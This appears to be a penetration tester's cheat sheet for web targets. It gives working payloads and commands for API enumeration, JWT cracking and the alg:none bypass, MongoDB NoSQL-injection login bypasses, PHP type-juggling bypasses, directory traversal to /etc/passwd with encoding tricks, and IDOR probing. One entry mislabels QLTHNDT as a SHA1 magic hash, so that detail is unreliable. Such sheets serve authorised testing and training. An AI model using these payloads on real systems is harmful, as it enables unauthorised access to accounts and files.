# API Testing, NoSQL & Other Web Checks

## REST API Enumeration
```bash
curl -s http://$TARGET_IP/api/
curl -s http://$TARGET_IP/api/v1/
curl -s http://$TARGET_IP/swagger.json
curl -s http://$TARGET_IP/openapi.json
curl -s http://$TARGET_IP/graphql
gobuster dir -u http://$TARGET_IP/api -w /usr/share/seclists/Discovery/Web-Content/common.txt -x json,xml -t 50
```

## JWT Testing
```bash
# Decode JWT
echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNjrPkoLtqVhI5G8dA' | cut -d. -f2 | base64 -d 2>/dev/null

# Check for alg:none bypass - change "alg":"HS256" to "alg":"none"
# Hashcat JWT mode 16500
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## NoSQL Injection (MongoDB)
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# URL parameter injection
username[$ne]=nothing&password[$ne]=nothing
username[$regex]=.*&password[$regex]=.*
```

## PHP Type Juggling
```bash
# When PHP uses == instead of ===
# "admin" == 0 is TRUE in PHP
# Send: password=0  to bypass password check

# Magic hashes (if hash starts with 0e...)
# "0e12345" == "0e67890" is TRUE
240610708      # MD5: 0e...
QLTHNDT        # SHA1: 0e...
```

## Directory Traversal
```bash
../../../../etc/passwd
..%252f..%252f..%252fetc/passwd   # Double URL encode
....//....//....//etc/passwd       # PHP filter bypass
..;/                                # Tomcat bypass
```

## IDOR
```bash
http://$TARGET_IP/user/profile?id=1
http://$TARGET_IP/user/profile?id=2
http://$TARGET_IP/user/profile?id=3
```
